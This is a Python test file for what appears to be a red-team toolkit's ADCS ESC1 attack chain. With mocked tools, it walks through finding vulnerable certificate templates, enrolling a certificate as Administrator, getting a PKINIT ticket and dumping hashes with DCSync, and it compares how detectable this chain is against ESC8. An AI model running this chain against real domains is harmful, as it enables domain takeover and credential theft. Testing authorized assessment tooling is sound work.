#!/usr/bin/env python3
"""ADCS ESC1 chain profile — D5's second profile family.

ESC1 is structurally the quietest AD-side chain fieldkit ships:
5 steps, no coerce (no PetitPotam), no ntlmrelayx listener (no
event 4624 on a relayed auth). The whole thing is LDAP + HTTP +
Kerberos AS-REQ + DRSUAPI. Aggregate detection debt = 33 vs
esc8's 47.

The load-bearing bit: ESC1 requires a misconfigured template
where a low-priv user can enroll AND specify an arbitrary
Subject Alternative Name. The discover step uses `certipy find
-vulnerable` to identify such templates; the exploit step
enrolls with `-upn Administrator@corp` to get a cert whose SAN
lets the KDC treat it as Administrator's on PKINIT.

Reuses D4's _pkinit_action + _dcsync_action unchanged — proves
the chain module's composability is real.
"""
import os
import socket
import sys
import tempfile
import threading
import unittest
from unittest.mock import patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def _mk_run_result(stdout="", stderr="", exit_code=0, error=None,
                   timed_out=False):
    from fieldkit.runner import RunResult
    return RunResult(argv=["fake"], exit_code=exit_code, stdout=stdout,
                      stderr=stderr, error=error, timed_out=timed_out)


class ESC1ProfileRegistrationTest(unittest.TestCase):

    def test_esc1_registered(self):
        from fieldkit.chain import known_profiles
        self.assertIn("esc1", set(known_profiles()))

    def test_esc1_step_shape(self):
        from fieldkit.chain import profile
        ch = profile("esc1")("10.0.0.1")
        self.assertEqual([s.name for s in ch.steps], [
            "preflight:reachability",
            "discover:esc1-templates",
            "exploit:esc1-enroll",
            "post:pkinit-tgt",
            "post:dcsync",
        ])

    def test_esc1_aggregate_debt_quieter_than_esc8(self):
        # Structural property: ESC1 has no coerce step and no
        # ntlmrelayx listener, so it costs less than ESC8. If a
        # future edit makes ESC1 cost more, that's a red flag
        # worth reviewing.
        from fieldkit.chain import profile, Outcome
        esc1 = profile("esc1")("10.0.0.1")
        esc8 = profile("esc8")("10.0.0.1")
        for _ in esc1.steps:
            esc1.outcomes.append(Outcome(kind="ok", evidence=""))
        for _ in esc8.steps:
            esc8.outcomes.append(Outcome(kind="ok", evidence=""))
        self.assertLess(esc1.total_detection_cost,
                         esc8.total_detection_cost)


class ESC1DiscoverActionTest(unittest.TestCase):

    def _ctx(self, **overrides):
        class Ctx:
            domain = "CORP.LOCAL"
            cred = {"domain": "CORP.LOCAL", "username": "svc",
                    "password": "pw"}
            esc1_tool_bin = "/usr/bin/certipy-ad"
            esc1_timeout = 5
        for k, v in overrides.items():
            setattr(Ctx, k, v)
        return Ctx()

    def _chain(self):
        from fieldkit.chain import Chain
        return Chain(profile="esc1", target="10.0.0.1", steps=())

    def test_no_domain_produces_manual(self):
        from fieldkit.chain import _esc1_discover_action
        out = _esc1_discover_action(self._chain(), self._ctx(domain=None))
        self.assertEqual(out.kind, "manual")
        self.assertIn("domain", out.evidence)

    def test_no_cred_produces_manual(self):
        from fieldkit.chain import _esc1_discover_action
        out = _esc1_discover_action(self._chain(), self._ctx(cred=None))
        self.assertEqual(out.kind, "manual")
        self.assertIn("cred", out.evidence)

    def test_no_vulnerable_templates_produces_skip(self):
        # No ESC1 templates found → skip (profile aborts; no target
        # to enroll against).
        from fieldkit.chain import _esc1_discover_action
        from fieldkit import runner as runner_mod
        with patch.object(runner_mod, "run",
                    return_value=_mk_run_result(
                        stdout="[*] Enumerating templates via LDAP\n"
                                "[*] No vulnerable templates found\n")):
            out = _esc1_discover_action(self._chain(), self._ctx())
        self.assertEqual(out.kind, "skip")

    def test_ok_parses_templates_and_ca_name(self):
        from fieldkit.chain import _esc1_discover_action
        from fieldkit import runner as runner_mod
        # Real certipy output shape (abbreviated).
        stdout = (
            "[*] Enumerating templates via LDAP\n"
            "CA Name                             : CORP-CA\n"
            "\n"
            "[!] Vulnerabilities\n"
            "ESC1\n"
            "  Template Name                     : User-Enroll-Any\n"
            "  Enrollment Rights                 : CORP.LOCAL\\\\Domain Users\n"
            "  Enabled                           : True\n"
            "ESC1\n"
            "  Template Name                     : Web-Server-Alt-SAN\n"
            "  Enrollment Rights                 : CORP.LOCAL\\\\Authenticated Users\n"
            "ESC4\n"
            "  Template Name                     : SomethingElse\n")
        with patch.object(runner_mod, "run",
                    return_value=_mk_run_result(stdout=stdout)):
            out = _esc1_discover_action(self._chain(), self._ctx())
        self.assertEqual(out.kind, "ok")
        self.assertEqual(out.data["esc1_templates"],
                          ["User-Enroll-Any", "Web-Server-Alt-SAN"])
        self.assertEqual(out.data["esc1_ca_name"], "CORP-CA")
        self.assertEqual(out.data["esc1_first_template"], "User-Enroll-Any")


class ESC1EnrollActionTest(unittest.TestCase):

    def _chain(self):
        from fieldkit.chain import Chain
        ch = Chain(profile="esc1", target="10.0.0.1", steps=())
        ch.artifacts.update({
            "esc1_first_template": "User-Enroll-Any",
            "esc1_ca_name": "CORP-CA",
        })
        return ch

    def _ctx(self, **overrides):
        class Ctx:
            domain = "CORP.LOCAL"
            cred = {"domain": "CORP.LOCAL", "username": "svc",
                    "password": "pw"}
            impersonate = "Administrator"
            esc1_tool_bin = "/usr/bin/certipy-ad"
            esc1_enroll_timeout = 5
        for k, v in overrides.items():
            setattr(Ctx, k, v)
        return Ctx()

    def test_missing_template_fails(self):
        from fieldkit.chain import _esc1_enroll_action, Chain
        # Fresh chain without the discover-step artifacts.
        ch = Chain(profile="esc1", target="10.0.0.1", steps=())
        out = _esc1_enroll_action(ch, self._ctx())
        self.assertEqual(out.kind, "fail")
        self.assertIn("discover step", out.evidence)

    def test_no_tool_produces_manual_with_hint(self):
        from fieldkit.chain import _esc1_enroll_action
        with patch("shutil.which", return_value=None):
            out = _esc1_enroll_action(self._chain(),
                                       self._ctx(esc1_tool_bin=None))
        self.assertEqual(out.kind, "manual")
        self.assertIn("certipy-ad req", out.evidence)
        self.assertIn("User-Enroll-Any", out.evidence)
        self.assertIn("Administrator@CORP.LOCAL", out.evidence)

    def test_permission_denied_produces_skip(self):
        from fieldkit.chain import _esc1_enroll_action
        from fieldkit import runner as runner_mod
        with patch.object(runner_mod, "run",
                    return_value=_mk_run_result(
                        stdout="[!] PERMISSION_DENIED — ACL doesn't grant\n")):
            out = _esc1_enroll_action(self._chain(), self._ctx())
        self.assertEqual(out.kind, "skip")
        self.assertIn("denied", out.evidence)

    def test_ok_reads_pfx_bytes_into_artifacts(self):
        # certipy writes the PFX to disk + prints the path; the
        # step reads it back into base64 for the downstream PKINIT
        # step (which uses chain.artifacts["cert_bytes"]).
        from fieldkit.chain import _esc1_enroll_action
        from fieldkit import runner as runner_mod
        with tempfile.TemporaryDirectory() as tmp:
            pfx_path = os.path.join(tmp, "administrator.pfx")
            with open(pfx_path, "wb") as fh:
                fh.write(b"FAKE-PFX-BYTES-" + b"A" * 500)
            stdout = (f"[*] Requesting certificate via RPC\n"
                       f"[*] Successfully requested certificate\n"
                       f"[*] Saved certificate and private key to '{pfx_path}'\n")
            with patch.object(runner_mod, "run",
                        return_value=_mk_run_result(stdout=stdout)):
                out = _esc1_enroll_action(self._chain(), self._ctx())
        self.assertEqual(out.kind, "ok")
        # cert_bytes populated (base64) so downstream pkinit_action
        # reads it.
        self.assertIn("cert_bytes", out.data)
        self.assertIn("cert_principal", out.data)
        self.assertEqual(out.data["cert_principal"], "CORP/Administrator")


class ESC1EndToEndTest(unittest.TestCase):
    """Mock every subprocess and walk the whole ESC1 chain against
    a mock target with a bound reachability port."""

    def _open_local_listener(self):
        s = socket.socket()
        s.bind(("127.0.0.1", 0))
        s.listen(1)
        port = s.getsockname()[1]
        def _acc():
            try:
                while True:
                    c, _ = s.accept()
                    c.close()
            except OSError:
                return
        threading.Thread(target=_acc, daemon=True).start()
        return port, s

    def _fake_run(self, argv, **kw):
        binary = argv[0] if argv else ""
        if "certipy" in binary and "find" in argv:
            return _mk_run_result(stdout=(
                "CA Name : CORP-CA\n"
                "ESC1\n"
                "  Template Name : User-Enroll-Any\n"))
        if "certipy" in binary and "req" in argv:
            # Write the PFX so the enroll step can read it back.
            for i, tok in enumerate(argv):
                if tok == "-upn":
                    # certipy would write to <upn>.pfx in cwd; use a
                    # temp path so the test cleans up.
                    pass
            # We can't dictate the pfx path without a real filesystem —
            # write our fake to a known temp path and echo it in stdout.
            import tempfile as _tf
            fd, pfx_path = _tf.mkstemp(suffix=".pfx")
            with os.fdopen(fd, "wb") as fh:
                fh.write(b"FAKE-PFX-BYTES-" + b"A" * 500)
            self._pfx_written = pfx_path
            return _mk_run_result(stdout=(
                "[*] Requesting certificate\n"
                f"[*] Saved certificate and private key to '{pfx_path}'\n"))
        if "certipy" in binary and "auth" in argv:
            return _mk_run_result(stdout=(
                "[*] Got TGT for CORP/Administrator\n"
                "[*] Saved credential cache to '/tmp/admin.ccache'\n"
                "[*] Got hash for CORP/Administrator: "
                "aad3b435b51404eeaad3b435b51404ee:"
                "31d6cfe0d16ae931b73c59d7e0c089c0\n"))
        if "nxc" in binary or "netexec" in binary:
            return _mk_run_result(stdout=(
                "CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:"
                "abababababababababababababababab:::\n"))
        return _mk_run_result()

    def test_full_esc1_chain_proves(self):
        from fieldkit.chain import profile as chain_profile, walk

        port, sock = self._open_local_listener()
        self.addCleanup(sock.close)

        # Persist Store for chain artifact + cred check.
        from fieldkit.state import Store
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        s = Store.create(os.path.join(tmp.name, "e.db"))
        s.init_engagement("test")
        self.addCleanup(s.close)

        class Ctx:
            probe_port = port
            probe_timeout = 1.0
            domain = "CORP.LOCAL"
            cred = {"domain": "CORP.LOCAL", "username": "svc", "password": "pw"}
            impersonate = "Administrator"
            esc1_tool_bin = "/usr/bin/certipy-ad"
            esc1_timeout = 5
            esc1_enroll_timeout = 5
            pkinit_tool_bin = "/usr/bin/certipy-ad"
            pkinit_timeout = 5
            dcsync_tool_bin = "/usr/bin/nxc"
            dcsync_timeout = 5
        Ctx.store = s

        ch = chain_profile("esc1")("127.0.0.1")
        with patch("fieldkit.runner.run", side_effect=self._fake_run):
            walk(ch, Ctx())

        self.assertEqual(ch.status, "proven",
                         msg=f"outcomes: {[(s.name, o.kind, o.evidence[:80]) for s, o in zip(ch.steps, ch.outcomes)]}")
        self.assertEqual(len(ch.outcomes), 5)
        by_name = {ch.steps[i].name: ch.outcomes[i] for i in range(5)}
        self.assertEqual(by_name["preflight:reachability"].kind, "ok")
        self.assertEqual(by_name["discover:esc1-templates"].kind, "ok")
        self.assertEqual(by_name["exploit:esc1-enroll"].kind, "ok")
        self.assertEqual(by_name["post:pkinit-tgt"].kind, "ok")
        self.assertEqual(by_name["post:dcsync"].kind, "ok")

        # Artifacts threaded through
        self.assertEqual(ch.artifacts["esc1_first_template"],
                          "User-Enroll-Any")
        self.assertEqual(ch.artifacts["cert_principal"],
                          "CORP/Administrator")
        self.assertEqual(ch.artifacts["ccache_path"], "/tmp/admin.ccache")
        self.assertGreaterEqual(ch.artifacts["dcsync_count"], 1)


if __name__ == "__main__":
    unittest.main()
